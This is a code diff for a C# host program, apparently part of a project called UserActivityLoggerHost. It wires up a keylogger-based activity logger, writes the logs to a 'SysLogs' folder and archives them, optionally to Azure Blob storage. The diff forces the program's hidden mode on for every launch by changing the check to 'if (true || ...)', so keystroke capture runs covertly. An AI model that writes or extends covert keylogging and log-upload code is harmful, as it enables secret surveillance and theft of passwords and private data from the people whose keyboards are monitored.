@@ -13,24 +13,25 @@ namespace Host
     class Program
     {
         static string _logFolder;
+        static string _archiveLocation;
         static void Main(string[] args)
         {
 
-            if (SingleInstance.IsApplicationAlreadyRunning("UserActivityLoggerHost2"))
+            if (SingleInstance.IsApplicationAlreadyRunning("UserActivityLoggerHost"))
             {
                 return;
             }
 
           
-            if ( args.Length > 0 && args[0] == "hidden")
+            if (true || args.Length > 0 && args[0] == "hidden")
             {
                 _logFolder = Path.Combine(GetRootFolderPath(), "SysLogs");
 
                 new UnhandledExceptionHandlercs().Register(ErrrorLogger.LogError);
 
-                new LogFileArchiver(GetFileSystem(), GetArchiveLocation()).StartPurging(_logFolder, TimeSpan.FromMinutes(5));
+                new LogFileArchiver(GetFileSystem(), _archiveLocation).StartPurging(_logFolder, TimeSpan.FromMinutes(5));
 
-                //new LogFileArchiver(GetFileSystem(), GetArchiveLocation()).StartPurging(_logFolder, TimeSpan.FromSeconds(5));
+                //new LogFileArchiver(GetFileSystem(), _archiveLocation).StartPurging(_logFolder, TimeSpan.FromSeconds(5));
 
                 var activityLogger = new ActivityLogger(TimeSpan.FromSeconds(2), _logFolder, new KeyLogger());
 
@@ -84,18 +85,16 @@ namespace Host
             switch (configuredFileSystem.ToUpperInvariant())
             {
                 case "NTFS":
+                    _archiveLocation = ConfigurationManager.AppSettings["ArchiveLocation_NTFS"];
                     return new NtfsFileSystem();
                     break;
                 case "AZUREBLOB":
+                    _archiveLocation = ConfigurationManager.AppSettings["ArchiveLocation_AZUREBLOB"];
                     return new AzureBlobFileSystem(ConfigurationManager.AppSettings["StorageConnectionString"]);
                     break;
             }
 
             return new NtfsFileSystem();
-        }
-        private static string GetArchiveLocation()
-        {
-            return ConfigurationManager.AppSettings["ArchiveLocation"];
         }
     }
 }
